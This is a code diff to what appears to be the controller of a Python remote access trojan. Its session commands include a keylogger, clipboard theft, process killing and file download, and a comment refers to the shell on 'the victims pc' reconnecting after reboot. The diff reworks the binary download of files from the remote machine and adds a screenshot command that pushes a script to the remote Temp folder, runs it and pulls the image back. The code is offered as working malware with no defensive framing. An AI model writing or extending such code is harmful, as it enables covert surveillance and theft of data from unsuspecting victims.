@@ -24,7 +24,7 @@ session_ids = []
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                     "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
-                    "error"]
+                    "error", "screenshot"]
 
 
 class Commands:
@@ -215,8 +215,7 @@ class Commands:
 
         # uninstalls the whole shell
         elif message == "uninstall":
-            user = sendMessage("c o echo %USERNAME%")
-            user = user.replace("\n", "")
+            user = sendMessage("c o echo %USERNAME%").replace("\n", "")
             with open("extraScripts/uninstall.bat", "r") as file:
                 sendMessage(file.read())
             name = receiveMessage()
@@ -295,14 +294,23 @@ class Commands:
         elif message == "download":
             if args:
                 path = " ".join(args).replace("\\", "/")
-                ending = path[path.index("."):]
+                ending = path[path.rfind("."):]
                 drive = path[0].upper()
                 path = path[1:]
-                path = drive+path
+                path = drive + path
                 sendMessage(f'r {path}')
-                downloaded = receiveMessage()
-                with open(f"download{ending}", "w") as download:
-                    download.write(downloaded)
+                download = conn.recv(2048)
+                name = f"download{randint(0, 1000)}"
+                if download == b"err":
+                    print("Path could not be found")
+                else:
+                    while download:
+                        if download[-4:] != b"done":
+                            with open(f"{name}{ending}", "ab") as file:
+                                file.write(download)
+                            download = conn.recv(2048)
+                        else:
+                            return
             elif not args:
                 print("You need to specify a path")
             else:
@@ -328,8 +336,29 @@ class Commands:
                 print("you need to specify the quantity of windows type 'help' for more")
             else:
                 print("too many arguments type 'help' for more")
+        # takes a screenshot
+        elif message == "screenshot":
+            usersName = str(sendMessage("c o echo %USERNAME%").replace("\n", ""))
+            with open("extraScripts/screen.py", "r") as file:
+                sendMessage(file.read())
+            name = receiveMessage()
+            sendMessage(f"c n python C:\\Users\\{usersName}\\AppData\\Local\\Temp\\{name}")
+            # waits for file creation
+            sleep(1)
+            # request file
+            sendMessage(f"r C:\\Users\\Public\\monitor-1.png")
+            pic = conn.recv(2048)
+            name = f"screenshot{randint(0, 1000)}.png"
+            while pic:
+                print(pic)
+                if pic[-4:] != b"done":
+                    with open(f"{name}", "ab") as file:
+                        file.write(pic)
+                    pic = conn.recv(2048)
+                else:
+                    return
 
-        # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
+                    # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
             conn.close()
